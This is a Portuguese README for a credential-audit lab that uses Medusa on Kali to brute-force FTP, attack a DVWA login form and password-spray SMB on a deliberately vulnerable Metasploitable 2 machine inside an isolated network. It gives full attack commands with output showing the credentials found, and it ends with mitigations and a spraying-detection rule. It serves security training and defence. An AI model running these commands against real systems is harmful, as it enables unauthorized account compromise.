# Laboratório de Auditoria de Credenciais — Kali Linux + Medusa

![Status](https://img.shields.io/badge/status-lab%20executado-brightgreen)
![Escopo](https://img.shields.io/badge/escopo-rede%20isolada-red)
![Kali](https://img.shields.io/badge/Kali-2026.3-557C94)
![Medusa](https://img.shields.io/badge/Medusa-2.3-orange)
![Licença](https://img.shields.io/badge/licen%C3%A7a-MIT-blue)

Projeto prático: usar o **Medusa** no Kali Linux para simular ataques de
força bruta e *password spraying* contra **Metasploitable 2** (que já traz o **DVWA**), em
rede isolada, e transformar cada achado em medida de prevenção.

Todos os números deste README vieram de execução real no laboratório: alvo em
`192.168.56.103`, rede Host-only do VirtualBox, logs gerados com `-O`.

> **Aviso legal.** Conteúdo produzido em máquinas próprias, com alvos intencionalmente
> vulneráveis e IPs privados de rede virtual. Força bruta e *spraying* contra sistemas sem
> autorização escrita é crime (Lei 12.737/2012) e viola termos de serviço. A ferramenta é
> neutra; o uso não é.

---

## Sumário

- [Resultados em uma página](#resultados-em-uma-página)
- [Objetivos](#objetivos)
- [Arquitetura do laboratório](#arquitetura-do-laboratório)
- [Pré-requisitos](#pré-requisitos)
- [Configuração das VMs](#configuração-das-vms)
- [Preparação do Kali](#preparação-do-kali)
- [Cenário 1 — FTP](#cenário-1--ftp)
- [Cenário 2 — DVWA](#cenário-2--dvwa)
- [Cenário 3 — SMB e password spraying](#cenário-3--smb-e-password-spraying)
- [Três detalhes que custam tempo](#três-detalhes-que-custam-tempo)
- [Registro de evidências](#registro-de-evidências)
- [Mitigações](#mitigações)
- [Resultados e reflexão](#resultados-e-reflexão)
- [Estrutura do repositório](#estrutura-do-repositório)
- [Referências](#referências)

---

## Resultados em uma página

| # | Cenário | Alvo | Comando | Tentativas | Resultado |
|---|---------|------|---------|-----------:|-----------|
| 1 | FTP (força bruta) | `192.168.56.103:21` — vsftpd 2.3.4 | `medusa -M ftp` | **2** | credencial válida (`senha = usuário`) |
| 2 | DVWA (formulário web) | `192.168.56.103:80/dvwa/` | `medusa -M web-form` | **10** | credencial válida (`admin`) |
| 3 | SMB (password spraying) | `192.168.56.103:445` — Samba 3.0.20 | `medusa -M smbnt` | **1** | credencial válida + acesso a `ADMIN$` |
| 3b | SMB (spraying sem acerto) | idem | idem | 10 (10 contas × 1) | 0 acertos, **nenhum lockout** |

Leitura rápida:

1. **FTP**: a senha era igual ao usuário — `-e s` do Medusa achou na 2ª tentativa, antes de
   qualquer wordlist.
2. **DVWA**: 10 tentativas com lista de 10 senhas; o login do DVWA antigo não tem token
   CSRF, mas a página de brute force exige sessão (detalhado abaixo).
3. **SMB**: uma única senha testada contra a primeira conta da lista já deu acesso
   administrativo. O mesmo teste com senha inexistente gerou **10 falhas em 10 contas
   distintas, sem bloquear nada** — a assinatura do *spraying*.

---

## Objetivos

1. Entender o risco de senhas fracas, previsíveis e reutilizadas.
2. Identificar serviços expostos em um alvo de laboratório.
3. Usar o Medusa de forma consciente e limitada (poucas threads, parada no primeiro acerto).
4. Comparar **força bruta** (1 conta × N senhas) com **spraying** (N contas × 1 senha).
5. Documentar evidências sem publicar credenciais em claro.
6. Relacionar cada achado a um controle técnico ou operacional.

---

## Arquitetura do laboratório

| Componente | Papel | Endereço no lab |
|---|---|---|
| Kali Linux (host) | Máquina de auditoria | `192.168.56.1` (`vboxnet0`) |
| DHCP VirtualBox | Distribuição de IPs da rede isolada | `192.168.56.100` |
| **Metasploitable 2** | Alvo vulnerável (FTP, SMB, HTTP/DVWA, MySQL, Telnet, VNC) | `192.168.56.103` |

Rede **Host-only** (`vboxnet0`), sem bridge: as VMs não alcançam nem são alcançadas pela
rede doméstica. É o requisito que separa laboratório de incidente.

### Serviços encontrados no alvo

```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
```

O alvo é de propósito um "museu de software obsoleto": cada porta é uma lição de
protocolo legado. Este trabalho cobre 21 (FTP), 80 (DVWA) e 445 (SMB).

---

## Pré-requisitos

- VirtualBox com **Metasploitable 2** importada (a imagem já inclui o DVWA em `/dvwa/`).
- **Kali Linux** (usado: 2026.3) com `medusa`, `nmap`, `smbclient`, `enum4linux`.
- ~4 GB de RAM livres (a Meta2 usa 2 GB).
- Autorização explícita — aqui, laboratório próprio.

---

## Configuração das VMs

```bash
# 1. rede host-only isolada
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# 2. prender o alvo na rede isolada (nunca bridge)
VBoxManage modifyvm "metasploitable-2" \
  --nic1 hostonly --hostonlyadapter1 vboxnet0 --nic2 none

# 3. subir sem interface gráfica
VBoxManage startvm "metasploitable-2" --type headless
```

Descobrir o IP sem varrer a rede doméstica — lendo o lease do DHCP do VirtualBox:

```bash
grep -A2 'state="acked"' \
  ~/.config/VirtualBox/HostInterfaceNetworking-vboxnet0-Dhcpd.leases
# <Address value="192.168.56.103"/>
```

Confirmar apenas as portas do escopo:

```bash
nmap -sT -sV --version-light -p21,80,139,445 192.168.56.103
```

> Em muitas instalações `VBoxManage hostonlyif create/ipconfig` funciona sem `sudo`.
> Se pedir senha, rode só esses dois comandos com privilégio e mantenha o resto normal.

---

## Preparação do Kali

```bash
sudo apt update
sudo apt install -y medusa nmap smbclient enum4linux
medusa -V      # Medusa v2.3
medusa -d      # lista os módulos disponíveis
```

Módulos usados neste trabalho:

| Módulo | Para que serve |
|---|---|
| `ftp` | autenticação FTP (texto claro) |
| `web-form` | **formulário** HTML (POST/GET com campos) |
| `smbnt` | SMB/Samba (LM/NTLM/LMv2/NTLMv2, signing) |

Flags que importam:

| Flag | Significado |
|---|---|
| `-p` / `-P` | **senha** / arquivo de senhas |
| `-u` / `-U` | usuário / arquivo de usuários |
| `-n` | **porta** (não confundir com `-p`) |
| `-M` | módulo |
| `-m` | parâmetro do módulo (repetível) |
| `-e ns` | testa também senha vazia (`n`) e senha = usuário (`s`) |
| `-t` | threads simultâneas |
| `-f` | para no primeiro acerto no host |
| `-O` | grava log (evidência) |

---

## Cenário 1 — FTP

**Hipótese:** um serviço FTP de laboratório aceita credenciais previsíveis.

### Verificação manual

```bash
nc -nv 192.168.56.103 21
# 220 (vsFTPd 2.3.4)
```

Banner exposto: já revela versão com backdoor conhecida (vsftpd 2.3.4). O acesso anônimo
não foi usado; o caminho aqui é credencial de conta local.

### Enumeração de usuários

Usuários enumerados via SMB (mesmo alvo), sem tocar em dados de terceiros:

```bash
nmap -Pn -p445 --script smb-enum-users 192.168.56.103
# METASPLOITABLE\user (RID: 3002)  METASPLOITABLE\msfadmin ...
```

A lista em [`wordlists/users-lab.txt`](wordlists/users-lab.txt) sai dessa enumeração.

### Ataque

```bash
medusa -h 192.168.56.103 \
       -U wordlists/users-lab.txt \
       -P wordlists/passwords-lab.txt \
       -M ftp -e ns -t 2 -f -v 4 \
       -O evidence/ftp-medusa.log
```

```text
ACCOUNT CHECK: [ftp] ... User: msfadmin ... Password:  (1 of 12 complete)
ACCOUNT CHECK: [ftp] ... User: msfadmin ... Password: msfadmin (2 of 12 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
```

**Resultado: credencial válida na 2ª tentativa.** A senha é **igual ao nome do usuário** —
exatamente o caso que `-e s` cobre. Sem essa flag, o acerto ocorreria na 8ª senha da
wordlist, então a lição prática é: `-e ns` custa duas tentativas e resolve a falha mais
comum de todas.

### Validação do acesso

```python
from ftplib import FTP
f = FTP('192.168.56.103', timeout=15)
f.login('msfadmin', 'msfadmin')
print(f.getwelcome(), f.pwd(), sep='\n')
```

```text
220 (vsFTPd 2.3.4)
/home/msfadmin
drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable
```

O usuário cai no próprio home e lê o conteúdo. FTP não cifra nada: a credencial trafega em
texto claro e é capturável por qualquer sniffing na mesma rede.

---

## Cenário 2 — DVWA

DVWA já vem na Metasploitable 2 em `http://192.168.56.103/dvwa/`. Credencial padrão:
`admin` / `password`.

### O detalhe que muda o ataque

O **login** do DVWA antigo responde **302 sem corpo**:

| Situação | Status | `Location` |
|---|---|---|
| senha errada | 302 | `login.php` |
| senha certa | 302 | `index.php` |

Como o módulo `web-form` decide pelo **texto** da resposta, e o corpo é vazio nos dois
casos, atacar o `login.php` direto gera falso positivo (ausência de `DENY-SIGNAL` é
interpretada como sucesso).

A solução é atacar a **página de brute force** (`/dvwa/vulnerabilities/brute/`), que
devolve texto claro e exige apenas um cookie de sessão válido:

```text
senha errada -> "Username and/or password incorrect."
senha certa  -> "Welcome to the password protected area admin"
```

### Ataque

Primeiro, uma sessão legítima (o ataque é contra a página autenticada):

```bash
curl -s -c dv.txt http://192.168.56.103/dvwa/login.php -o /dev/null
curl -s -b dv.txt -c dv.txt -X POST \
     -d 'username=admin&password=password&Login=Login' \
     http://192.168.56.103/dvwa/login.php -o /dev/null
SID=$(awk '/PHPSESSID/{print $7}' dv.txt)
```

Depois o Medusa, reaproveitando o cookie:

```bash
medusa -h 192.168.56.103 -n 80 \
       -u admin -P wordlists/passwords-lab.txt \
       -M web-form \
       -m FORM:"/dvwa/vulnerabilities/brute/" \
       -m DENY-SIGNAL:"Username and/or password incorrect" \
       -m FORM-DATA:"get?username=&password=&Login=Login" \
       -m CUSTOM-HEADER:"Cookie: PHPSESSID=$SID" \
       -t 1 -f -v 4 \
       -O evidence/dvwa-brute.log
```

```text
ACCOUNT FOUND: [web-form] Host: 192.168.56.103 User: admin Password: password [SUCCESS]
```

**Resultado: credencial válida na 10ª tentativa** (última posição da wordlist). Validação
manual: a mesma requisição com a senha correta devolve
`Welcome to the password protected area admin`.

### O que isso ensina

- O DVWA antigo **não tem** rate limit nem CAPTCHA nessa página: 10 tentativas em ~1 segundo.
- O token CSRF do login (nas versões novas do DVWA) é defesa real: sem ele, a automação
  precisa de sessão e de um `DENY-SIGNAL` estável.
- `web-form` não segue redirect nem mantém sessão sozinho: `CUSTOM-HEADER` com cookie é o
  que faz o ataque funcionar em página autenticada.

---

## Cenário 3 — SMB e password spraying

### Enumeração de usuários

```bash
nmap -Pn -p445 --script smb-enum-users,smb-os-discovery 192.168.56.103
```

```text
OS: Unix (Samba 3.0.20-Debian)
Computer name: metasploitable
METASPLOITABLE\user (RID: 3002)
METASPLOITABLE\msfadmin ...
```

Alternativa clássica: `enum4linux -a 192.168.56.103`.

### Password spraying (1 senha × N contas)

```bash
medusa -h 192.168.56.103 \
       -U wordlists/users-lab.txt \
       -p msfadmin \
       -M smbnt -m GROUP:LOCAL -m MODE:NETBIOS \
       -t 1 -v 4 \
       -O evidence/smb-spray.log
```

```text
ACCOUNT FOUND: [smbnt] Host: 192.168.56.103 User: msfadmin Password: msfadmin
               [SUCCESS (ADMIN$ - Access Allowed)]
```

**Resultado: acerto na 1ª conta testada**, com acesso a `ADMIN$` (compartilhamento
administrativo). Detalhes do módulo: `GROUP:LOCAL` força conta local; `MODE:NETBIOS`
usa NetBIOS em vez de SMB2, necessário para Samba antigo.

Validação manual:

```bash
smbclient -L //192.168.56.103 -U 'msfadmin%msfadmin' -W WORKGROUP
```

```text
Sharename   Type   Comment
print$      Disk   Printer Drivers
tmp         Disk   oh noes!
IPC$        IPC    IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$      IPC    IPC Service (metasploitable server (Samba 3.0.20-Debian))
msfadmin    Disk   Home Directories
```

### O contraponto necessário: spraying que **não** acerta

Mesma lista de 10 contas, uma senha que não existe:

```bash
medusa -h 192.168.56.103 -U wordlists/users-lab.txt \
       -p 'Inverno2026!' -M smbnt -m GROUP:LOCAL -m MODE:NETBIOS -t 1 -v 4
```

**10 tentativas, 10 contas distintas, 1 falha em cada, nenhum lockout.**

Esse é o resultado mais importante do cenário. Uma política de bloqueio "5 falhas na mesma
conta" **nunca dispara** com spraying. A detecção precisa olhar o padrão agregado:
*N usuários distintos + mesma senha + mesma origem + janela curta*.

---

## Três detalhes que custam tempo

**1. `-M http` não faz login em formulário.** O módulo `http` cobre apenas
Basic/Digest/NTLM. Passar `-m FORM:...` para ele gera `WARNING: Invalid method: FORM`,
ignora as opções e pode reportar sucesso falso. Formulário é `-M web-form`.

**2. `-p` é senha; a porta é `-n`.** `medusa -p 8080` testa a senha "8080" na porta padrão.

**3. O log do Medusa grava a senha em claro.** Antes de publicar:

```bash
sed -i -E 's/(Password: ).*/\1********/' evidence/*.log
```

Log de ferramenta não é relatório: sanitize e anexe o original apenas onde for permitido.

---

## Registro de evidências

Modelo pronto em [`evidence/report-template.md`](evidence/report-template.md). Um bom
registro contém:

| Campo | Exemplo |
|---|---|
| Data/hora | `2026-11-11 09:19 BRT` |
| Alvo | `192.168.56.103` (rede host-only) |
| Serviço | FTP / DVWA / SMB |
| Comando | completo, com `-O` |
| Tentativas | número exato |
| Resultado | sucesso / falha / bloqueio / incompatibilidade |
| Validação manual | cliente independente (ftplib, smbclient, curl) |
| Impacto | o que ficou acessível no laboratório |
| Mitigação | controle técnico correspondente |

Antes de publicar: mascarar senhas, remover cookies/tokens e não incluir dados pessoais.

---

## Mitigações

| Cenário | Achado | Mitigação prioritária |
|---|---|---|
| FTP | senha = usuário, protocolo em texto claro | SFTP/FTPS, política de senha, `max_login_fails`, `fail2ban` |
| DVWA | login sem rate limit, sem MFA | rate limit + backoff + 429, MFA, mensagem genérica (o DVWA é feio de propósito) |
| SMB | credencial administrativa fraca | desativar NTLM/SMBv1, senha única, restringir 139/445, MFA |
| Spraying | bloqueio por conta é insuficiente | bloqueio por IP/origem + detecção por padrão agregado |

Exemplos de endurecimento:

```ini
# vsftpd
anonymous_enable=NO
max_login_fails=3
delay_failed_login=3
ssl_enable=YES
```

```ini
# fail2ban para FTP
[vsftpd]
enabled  = true
maxretry = 3
bantime  = 3600
```

Regra de detecção de spraying (SIEM):

```text
autenticação falha, agrupar por ip_origem em janela de 5 min
disparar se: usuários_distintos >= 5  e  senhas_distintas <= 2
```

Note a inversão: força bruta = **poucos usuários, muitas senhas**; a regra que pega uma
não pega a outra.

---

## Resultados e reflexão

O que os números dizem:

- **2 tentativas** derrubaram o FTP porque a senha era o nome do usuário.
- **1 tentativa** deu acesso administrativo via SMB.
- **10 tentativas** acharam a senha do DVWA, sem nenhum atraso imposto pela aplicação.
- **10 tentativas distribuídas** em 10 contas não geraram bloqueio algum.

O aprendizado central não é "o Medusa funciona" — isso era esperado. É que **o custo de
defesa é muito menor que o custo de um incidente**: um rate limit de vinte linhas, uma
política de senha que proíbe "usuário = senha" e `fail2ban` teriam mudado todos os quatro
resultados acima. E o cenário 3 mostra que a defesa mais difundida (bloqueio por conta)
resolve apenas metade do problema.

Perguntas que o desafio propõe, respondidas com os dados:

| Pergunta | Resposta medida |
|---|---|
| Qual serviço aceitou a combinação? | FTP, DVWA e SMB (todos) |
| Quantas tentativas foram necessárias? | 2 (FTP), 10 (DVWA), 1 (SMB) |
| Houve limitação, atraso ou bloqueio? | Não — nenhum dos três tem rate limit |
| O que muda com senha forte? | A lista de 10 senhas deixa de ter efeito |
| Quais logs registraram? | `-O` do Medusa + validação manual documentada |
| Mitigação de maior prioridade? | proibir senha = usuário e aplicar rate limit |

Próximos passos possíveis: medir tentativas/segundo até o bloqueio, subir regras de
detecção (Suricata/Wazuh) e comparar com o mesmo ataque, e testar `-M ssh` com
`PasswordAuthentication no`.

---

## Estrutura do repositório

```text
.
├── README.md
├── LICENSE
├── wordlists/
│   ├── users-lab.txt        # usuários enumerados no alvo (laboratório)
│   └── passwords-lab.txt    # 10 senhas comuns, inclui a de laboratório
└── evidence/
    └── report-template.md   # modelo de registro de teste
```

As wordlists são **fictícias e pequenas** (10 entradas cada). Existem apenas para o
laboratório: nenhuma senha real de terceiro, nenhuma lista de vazamento.

> `users-lab.txt` foi montada a partir da enumeração autorizada do próprio alvo; a ordem
> importa, porque com `-f` o custo do ataque é a posição do acerto na lista.

---

## Referências

- [Medusa — documentação upstream](https://jmk-foofus.github.io/medusa/medusa.html)
- [Medusa no Kali Linux](https://www.kali.org/tools/medusa/)
- [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [VirtualBox — Host-Only Networking](https://www.virtualbox.org/manual/ch06.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Credential Stuffing Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
- [NIST SP 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [MITRE ATT&CK — T1110 Brute Force](https://attack.mitre.org/techniques/T1110/)

---

## Licença

MIT — ver [`LICENSE`](LICENSE). O uso das técnicas permanece condicionado à autorização do
proprietário do ambiente.
